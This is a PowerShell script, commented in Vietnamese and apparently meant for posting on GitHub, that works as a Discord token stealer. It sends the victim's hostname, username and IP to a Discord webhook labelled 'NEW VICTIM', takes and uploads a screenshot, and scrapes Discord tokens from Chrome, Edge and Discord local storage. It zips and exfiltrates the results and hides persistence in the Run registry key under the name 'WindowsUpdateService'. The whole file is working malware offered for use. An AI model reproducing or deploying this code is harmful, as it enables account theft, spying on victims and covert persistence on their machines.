# payload.ps1 - Bản sửa lỗi, copy nguyên bản này lên GitHub
$webhook = "https://discord.com/api/webhooks/ID_CUA_BAN/TOKEN"

# Lấy thông tin
$hostname = $env:COMPUTERNAME
$username = $env:USERNAME
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
try { $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 5).Content } catch { $ip = "Unknown" }

# Gửi thông tin về Discord
$msg = @{content = "**🔴 NEW VICTIM**`n🖥️ Hostname: $hostname`n👤 User: $username`n🌐 IP: $ip`n📅 Time: $time"} | ConvertTo-Json
try { Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType "application/json" -TimeoutSec 5 } catch {}

# Chụp màn hình
try {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
    $bmp = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
    $ssPath = "$env:TEMP\screenshot.png"
    $bmp.Save($ssPath, [System.Drawing.Imaging.ImageFormat]::Png)
    $g.Dispose(); $bmp.Dispose()
    Invoke-RestMethod -Uri $webhook -Method Post -InFile $ssPath -ContentType "multipart/form-data"
    Remove-Item $ssPath
} catch {}

# Đánh cắp token
$tokens = @()
$paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
    "$env:APPDATA\discord\Local Storage\leveldb"
)
$regex = '[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}'
foreach ($p in $paths) {
    if (Test-Path $p) {
        Get-ChildItem $p -Filter *.log -ErrorAction SilentlyContinue | ForEach-Object {
            $c = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            $m = [regex]::Matches($c, $regex)
            foreach ($match in $m) { $tokens += $match.Value }
        }
    }
}
$tokens = $tokens | Select-Object -Unique
if ($tokens.Count -gt 0) {
    $body = @{content = "🎯 Tokens: " + ($tokens -join ", ")} | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
}

# Tạo và gửi file ZIP
$zipPath = "$env:TEMP\$hostname.zip"
try {
    Compress-Archive -Path $ssPath -DestinationPath $zipPath -Force
    if ($tokens.Count -gt 0) {
        $tokenFile = "$env:TEMP\tokens.txt"
        $tokens | Out-File $tokenFile
        Compress-Archive -Path $tokenFile -DestinationPath $zipPath -Update
        Remove-Item $tokenFile
    }
    Invoke-RestMethod -Uri $webhook -Method Post -InFile $zipPath -ContentType "multipart/form-data"
    Remove-Item $zipPath
} catch {}

# Tự khởi động cùng Windows
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdateService" -Value (Get-Item $PSCommandPath).FullName -ErrorAction SilentlyContinue
} catch {}
